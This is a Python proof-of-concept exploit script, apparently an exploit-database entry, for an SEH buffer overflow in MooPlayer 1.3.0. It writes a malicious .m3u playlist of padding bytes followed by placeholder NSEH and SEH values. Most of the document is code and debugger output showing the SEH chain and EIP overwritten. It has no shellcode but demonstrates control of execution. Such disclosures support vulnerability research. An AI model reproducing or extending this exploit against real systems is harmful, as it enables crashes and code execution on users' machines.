#!/usr/bin/env python
##########################################################################################
# Exploit Title: MooPlayer 1.3.0 'm3u' SEH Buffer Overflow POC
# Date Discovered: 09-02-2015
# Exploit Author: Samandeep Singh ( SaMaN - @samanL33T )
# Vulnerable Software: Moo player 1.3.0
# Software Link: https://mooplayer.jaleco.com/
# Vendor site: https://mooplayer.jaleco.com/
# Version: 1.3.0
# Tested On: Windows XP SP3, Win 7 x86.
##########################################################################################
#  -----------------------------------NOTES----------------------------------------------#
##########################################################################################
# After the execution of POC, the SEH chain looks like this: 
# 01DDF92C ntdll.76FF71CD
# 01DDFF5C 43434343
# 42424242 *** CORRUPT ENTRY ***

# And the Stack

#	01DDFF44   41414141  AAAA
#	01DDFF48   41414141  AAAA
#	01DDFF4C   41414141  AAAA
#	01DDFF50   41414141  AAAA
#	01DDFF54   41414141  AAAA
#	01DDFF58   41414141  AAAA
#	01DDFF5C   42424242  BBBB  Pointer to next SEH record
#	01DDFF60   43434343  CCCC  SE handler
#	01DDFF64   00000000  ....
#	01DDFF68   44444444  DDDD
#	01DDFF6C   44444444  DDDD
#	01DDFF70   44444444  DDDD

# And the Registers

#	EAX 00000000
#	ECX 43434343
#	EDX 76FF71CD ntdll.76FF71CD
#	EBX 00000000
#	ESP 01DDF918
#	EBP 01DDF938
#	ESI 00000000
#	EDI 00000000
#	EIP 43434343
head="http://"
buffer=10000
junk="\x41" * 264
nseh = "\x42" * 4
seh = "\x43" * 4
poc = head + junk + nseh + seh
junk1 = "\x44"*(buffer-len(poc))
poc += junk1
file = "mooplay_poc.m3u"
f=open(file,"w")
f.write(head + poc);
f.close();

#SaMaN(@samanL33T)